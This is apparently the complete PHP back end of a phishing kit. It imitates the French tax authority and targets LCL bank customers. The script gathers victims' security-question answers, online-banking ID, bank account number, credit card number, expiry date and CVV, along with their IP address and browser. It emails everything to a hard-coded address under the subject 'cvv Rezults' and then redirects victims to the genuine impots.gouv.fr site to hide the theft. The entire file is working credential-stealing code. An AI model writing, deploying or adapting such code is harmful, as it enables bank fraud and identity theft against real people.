<?php

$ip = getenv("REMOTE_ADDR");
$browser = getenv ("HTTP_USER_AGENT");
$message .= "-------------------| Dr SPAWN |-------------------\n";
$message .= "Rue grandi      : ".$_POST['reponses']."\n";
$message .= "Ami d'enfance   : ".$_POST['reponses2']."\n";
$message .= "==========Edited===By===AKONIAC==========\n";
$message .= "Sa m&#233;re LCL     : ".$_POST['reponseslcl']."\n";
$message .= "Son P&#233;re LCL    : ".$_POST['reponseslcl2']."\n";
$message .= "==========Edited===By===AKONIAC==========\n";
$message .= "Banque Distance : ".$_POST['ibad']."\n";
$message .= "==========Edited===By===AKONIAC==========\n";
$message .= "Nom de la banque: ".$_POST['bank']."\n";
$message .= "num de compte   : ".$_POST['account']."\n";
$message .= "Carte de credit : ".$_POST['ccnum']."\n";
$message .= "Date expiration : ".$_POST['expMonth']."/".$_POST['expYear']."\n";
$message .= "Cvv             : ".$_POST['cvv']."\n";
$message .= "-----------------------------------------------\n";
$message .= "IP Address : ".$ip."\n";
$message .= "Browser : ".$browser."\n";
$message .= "--------------------+|Dr SPAWN-------\n";
$message .= "+-----/!\-----|By SPAWN|-----/!\-----+\n";
$to = "mr.manager@yahoo.fr";
$subj = " cvv Rezults||".$ip."\n";
$from = "From: Impo Fresh  <me>";
mail($to, $subj, $message, $from);
header("Location: http://www.impots.gouv.fr");
?>